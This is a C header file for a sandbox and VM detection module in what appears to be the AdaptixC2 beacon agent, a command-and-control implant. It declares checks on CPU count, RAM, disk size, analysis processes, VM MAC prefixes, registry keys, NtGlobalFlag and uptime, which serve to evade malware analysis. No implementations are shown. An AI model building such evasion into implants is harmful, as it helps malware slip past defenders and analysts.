#pragma once
/*
 * Enhanced sandbox / VM detection module for AdaptixC2 beacon agent.
 *
 * Provides comprehensive detection of common sandbox and virtual machine
 * environments using multiple techniques:
 *
 * 1. CPU core count (< 2 → sandbox)
 * 2. RAM size (< 2 GB → sandbox)
 * 3. Disk size (< 100 GB → sandbox)
 * 4. Common sandbox processes (vmtoolsd, vboxservice, procmon, wireshark, etc.)
 * 5. MAC address prefix checking (VMware, VirtualBox, Parallels)
 * 6. VM registry key detection
 * 7. NtGlobalFlag check (debugger/sandbox flag)
 * 8. System uptime check (< 2 min → sandbox)
 *
 * All detection flags can be disabled with AX_SANDBOX_DETECT_DISABLE=1
 * at compile time (useful for testing on real hardware).
 *
 * Design: lightweight, no false-positives on real hardware,
 * degrades gracefully if APIs aren't available.
 */

#include <windows.h>
#include "ApiLoader.h"
#include "StrObfuscate.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ================================================================
 * Main detection entry point
 * Returns TRUE if sandbox/VM indicators are found.
 * ================================================================ */
BOOL SandboxDetect_IsSandbox(void);

/* ================================================================
 * Individual checks (exposed for composability)
 * ================================================================ */

/* CPU cores: < 2 → sandbox */
BOOL SandboxDetect_CheckCpuCores(void);

/* RAM size: < 2 GB → sandbox */
BOOL SandboxDetect_CheckRamSize(void);

/* Disk size: < 100 GB → sandbox (checks C:\ drive) */
BOOL SandboxDetect_CheckDiskSize(void);

/* Process list: scan PEB for known sandbox/analysis processes */
BOOL SandboxDetect_CheckProcesses(void);

/* MAC prefix: check adapter addresses for known VM OUI prefixes */
BOOL SandboxDetect_CheckMacPrefix(void);

/* Registry: check for known VM/sandbox registry keys */
BOOL SandboxDetect_CheckRegistry(void);

/* NtGlobalFlag: check PEB flags for debugger/sandbox indicators */
BOOL SandboxDetect_CheckNtGlobalFlag(void);

/* System uptime: < 2 minutes → suspicious */
BOOL SandboxDetect_CheckUptime(void);

#ifdef __cplusplus
}
#endif
